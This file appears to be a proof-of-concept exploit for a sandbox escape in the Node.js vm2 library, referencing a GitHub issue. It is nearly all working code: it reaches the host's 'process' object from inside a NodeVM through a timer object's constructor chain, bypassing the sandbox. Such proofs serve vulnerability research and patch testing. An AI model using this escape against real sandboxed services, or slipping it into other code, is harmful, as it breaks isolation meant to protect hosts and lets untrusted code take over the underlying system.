const {NodeVM} = require('vm2-3-6-10');
//not sure version
//https://github.com/patriksimek/vm2/issues/276
//echo process

const vm = new NodeVM();

console.log(vm.run('('+function() {
	exports.process = setTimeout(()=>{}).ref().constructor.constructor('return process')();
}+')()'));0